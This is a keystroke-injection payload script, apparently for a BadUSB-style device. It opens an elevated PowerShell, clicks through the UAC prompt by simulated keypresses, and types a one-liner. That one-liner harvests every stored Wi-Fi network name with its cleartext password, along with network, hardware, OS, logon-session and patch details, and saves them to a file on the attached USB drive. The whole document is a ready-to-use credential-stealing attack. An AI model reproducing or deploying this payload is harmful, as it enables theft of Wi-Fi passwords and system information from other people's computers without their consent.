layout('es');
delay(500);
press("GUI r");
delay(200);
type("powershell.exe");
press("CTRL SHIFT ENTER");
delay(3500);
press("LEFT");
delay(250);
press("ENTER");
delay(750)
press("ENTER");
delay(2500);
type('$o="AGH Computer Info v1.3`n`n PC Name: "+$Env:Computername+"`n`n";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$o+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;}$o+="`n`n Network`n`n";$o+=(Get-NetIPConfiguration -All | Out-String);$o+="Computer System`n`n";$o+=(Get-WmiObject -Class Win32_ComputerSystem | Out-String);$o+="Operating System`n`n";$o+=(Get-WmiObject -Class Win32_OperatingSystem | Out-String);$o+="Processor Information`n`n";$o+=(Get-WmiObject -Class Win32_Processor | Out-String);$o+="BIOS Information`n`n";$o+=(Get-WmiObject -Class Win32_BIOS | Out-String);$o+= "Desktop Information`n`n";$o+=(Get-WmiObject -Class Win32_Desktop | Out-String);$o+="Logon Session`n`n";$o+=(Get-WmiObject -Class Win32_LogonSession | Out-String);$o+="Hotfixes`n`n";$o+=(Get-WmiObject -Class Win32_QuickFixEngineering | Out-String);');
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'temp' } | select name\n");
type('$o | Out-File "$($usbPath.name)variable.txt";exit;\n');
press("ENTER");